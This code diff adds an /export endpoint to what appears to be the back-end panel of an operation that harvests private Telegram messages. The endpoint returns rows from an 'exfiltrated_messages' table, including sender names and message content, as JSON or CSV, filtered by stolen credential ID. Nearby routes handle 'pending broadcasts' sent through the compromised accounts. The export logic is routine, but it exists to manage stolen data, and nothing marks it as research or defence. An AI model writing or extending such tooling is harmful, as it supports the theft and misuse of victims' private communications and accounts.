@@ -1,9 +1,13 @@
 import logging
+import csv
+import io
 from datetime import UTC, datetime
-from typing import Any
+from typing import Any, Literal, Optional
 from urllib.parse import urlsplit, urlunsplit
+from uuid import UUID
 
-from fastapi import APIRouter, Depends, HTTPException
+from fastapi import APIRouter, Depends, HTTPException, Query
+from fastapi.responses import JSONResponse, StreamingResponse
 
 from app.core.audit import AuditEvent, AuditLogger
 from app.core.auth import require_monitor_key
@@ -109,6 +113,51 @@ async def list_messages(limit: int = 100):
         logger.exception("monitor/messages query failed")
         raise HTTPException(status_code=500, detail="Internal error") from exc
 
+
+@router.get("/export")
+async def export_messages(
+    credential_id: Optional[UUID] = Query(None),
+    format: Literal["json", "csv"] = Query("json"),
+    since: Optional[datetime] = Query(None),
+    limit: int = Query(1000, ge=1, le=10000),
+):
+    """Export exfiltrated messages as JSON or CSV. Filters: credential_id, since, limit."""
+    q = (
+        db.table("exfiltrated_messages")
+        .select("id,credential_id,telegram_msg_id,sender_name,content,media_type,is_broadcasted,created_at")
+        .order("created_at", desc=False)
+        .limit(min(limit, 10000))
+    )
+    if credential_id:
+        q = q.eq("credential_id", str(credential_id))
+    if since:
+        q = q.gte("created_at", since.isoformat())
+
+    result = q.execute()
+    rows = result.data or []
+
+    if format == "csv":
+        fieldnames = ["id", "credential_id", "telegram_msg_id", "sender_name",
+                      "content", "media_type", "is_broadcasted", "created_at"]
+        buf = io.StringIO()
+        writer = csv.DictWriter(buf, fieldnames=fieldnames, extrasaction="ignore")
+        writer.writeheader()
+        for row in rows:
+            # Replace None with empty string for CSV safety
+            writer.writerow({k: ("" if row.get(k) is None else row.get(k)) for k in fieldnames})
+        ts = datetime.now(UTC).strftime("%Y%m%dT%H%M%S")
+        buf.seek(0)
+        return StreamingResponse(
+            iter([buf.getvalue()]),
+            media_type="text/csv",
+            headers={"Content-Disposition": f"attachment; filename=messages-{ts}.csv"},
+        )
+
+    ts = datetime.now(UTC).strftime("%Y%m%dT%H%M%S")
+    return JSONResponse(
+        content=rows,
+        headers={"Content-Disposition": f"attachment; filename=messages-{ts}.json"},
+    )
 
 @router.get("/broadcasts/pending")
 def list_pending_broadcasts(limit: int = 100, failed_only: bool = False):
